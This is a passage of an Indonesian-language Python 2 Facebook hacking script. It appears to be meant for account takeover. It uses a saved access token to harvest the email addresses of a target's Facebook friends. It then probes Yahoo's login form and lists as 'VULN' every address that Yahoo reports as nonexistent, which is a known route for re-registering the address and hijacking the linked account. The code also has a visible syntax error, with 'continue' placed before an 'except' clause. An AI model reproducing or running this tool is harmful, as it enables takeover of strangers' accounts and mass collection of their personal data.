    elif guar == '0' or guar == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        guard_pilih()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable = True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': 'OAuth %s' % toket }
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data = data, headers = headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print '\x1b[97m[\x1b[92m\xe2\x9c\x93\x1b[97m]\x1b[92m Sukses Mengaktifkan ...'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        menu()
    elif '"is_shielded":false' in res.text:
        os.system('clear')
        print logo
        print '\x1b[97m[\x1b[91m\xe2\x9c\x93\x1b[97m]\x1b[91m Sukses Menonaktifkan ...'
        raw_input('\n\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
        menu()
    else:
        print '\x1b[91m[!] Error'
        keluar()


def menu_yahoo():
    global toket
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;92m01\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Clone dari daftar teman'
    print '\x1b[1;97m[\x1b[1;92m02\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Clone dari publik/teman'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Kembali'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('\x1b[1;93m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
    if go == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        yahoo_pilih()
    elif go == '1' or go == '01':
        yahoofriends()
    elif go == '2' or go == '02':
        yahoofromfriends()
    elif go == '0' or go == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        yahoo_pilih()


def yahoofriends():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    jalan('\x1b[1;97m[\x1b[1;92m~\x1b[1;97m] Mengambil email ...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/mailku.txt', 'w')
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] Mulai clone ...')
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr = 0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
                
        continue
        except KeyError:
            continue
        

    
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Selesai ...'
    print '\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total : ' + str(len(berhasil))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] File tersimpan : out/mailku.txt'
    save.close()
    raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
    os.system('python2 vip.py')


def yahoofromfriends():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        requests.exceptions.ConnectionError = None

    os.system('clear')
    print logo
    mpsh = []
    jml = 0
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    idt = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] ID publik/teman : ')
    
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Nama : ' + op['name']
    except KeyError:
        print '\x1b[1;91m[!] ID publik/teman tidak ada'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        menu_yahoo()

    jalan('\x1b[1;97m[\x1b[1;92m~\x1b[1;97m] Mengambil email ...')
    teman = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/mailteman.txt', 'w')
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] Mulai clone\x1b[1;97m...')
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr = 0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
                
        continue
        except KeyError:
            continue
        

    
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Selesai ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] Total : ' + str(len(berhasil))
    print '\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] File tersimpan : out/mailteman.txt'
    save.close()
    raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
    os.system('python2 XXXXX.py')


def saya():
    os.system('clear')
    print logo
    jalan('        \x1b[92mAnda Akan Di Arahkan Ke Browser')
    os.system('xdg-open https://www.facebook.com/tegar.sabila.908')
    menu()

if __name__ == '__main__':
    menu()
    masuk()
